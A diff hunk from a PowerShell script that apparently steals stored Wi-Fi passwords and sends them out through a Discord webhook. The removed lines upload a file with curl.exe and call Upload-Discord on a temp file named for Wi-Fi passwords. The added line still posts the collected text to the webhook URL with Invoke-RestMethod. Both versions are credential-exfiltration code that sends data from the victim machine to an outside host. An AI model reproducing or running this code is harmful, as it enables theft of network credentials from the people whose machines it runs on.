@@ -63,13 +63,7 @@ $Body = @{
   "content" = $text
 } | ConvertTo-Json
 
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'application/json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-}
-
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
+Invoke-RestMethod -ContentType 'application/json' -Uri $hookurl  -Method Post -Body $Body
 
 ############################################################################################################################################################
 
